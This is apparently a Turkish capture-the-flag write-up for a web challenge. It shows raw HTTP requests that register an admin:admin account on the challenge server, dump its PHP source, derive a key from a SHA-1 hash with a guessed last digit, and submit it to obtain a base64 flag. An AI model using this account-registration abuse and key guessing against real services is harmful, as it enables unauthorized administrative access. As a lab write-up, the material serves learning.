**Web400 Servis gibi servis :**



```
POST /86d37fde1020e969eca3d6436bddb4f5-04/ws/ws.php?islem=kayitOl&kullaniciAdi=admin&parola=admin HTTP/1.1
Host: 85.111.95.28
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://85.111.95.28/86d37fde1020e969eca3d6436bddb4f5-04/giris.html
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=a7ck5garq5olu9he3mkfbhj6h6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

islem=kayitOl&kullaniciAdi=admin&parola=admin
```


ile admin:admin olarak login olundu , php kodu dump edildi.

Bu süreç içinde alınan mesaj ile anlaşılması gereken şey 10 defa deneme hakkımız olduğudur.

```
Buralar çok güzel, giriş yap sen de gel bence.
====================================
Admin Kullanıcısı

Doğru cevabı girmen için deneme hakkın 10 tane. Bulduğunda ödülünü de alacaksın. Ona göre:
```


Biraz kaynak kodu analiz ettikten sonra `key`in parolamızın sha1 inin ilk 16 lık kısmı olduğunu anladık.

Son karakter = random(0,9)

5. karakter 8. basamak

diğer kısımda ise:

```
sha1sumhex('admin')[0:16]
'd033e22ae348aeb5'
```

burdan olması gerektiğini biliyoruz

d03_389 (! son karakter için 0 dan 9 a  kadar teker teker elle denemek gerekiyordu 9 dan başlayınca flag geldi.)

```
POST /86d37fde1020e969eca3d6436bddb4f5-04/ws/bakalimDogrumu.php HTTP/1.1
Host: 85.111.95.28
Content-Length: 13
Cache-Control: max-age=0
Origin: http://85.111.95.28
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://85.111.95.28/86d37fde1020e969eca3d6436bddb4f5-04/ws/index.php
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=a7ck5garq5olu9he3mkfbhj6h6
Connection: close

deger=d03_389
```

```
Flag == U1RpeWtYWWN6ZEw3b1VqRnhPcVhFVlZBbmtMdjJhRmRkTnFYUUV0Nkg5MGRacDUwOXlBKyt6NXVwSG9OOXRhNzgzaSsvVWh5Y2c3UTNYb29kTmhpWXc9PQ==
```
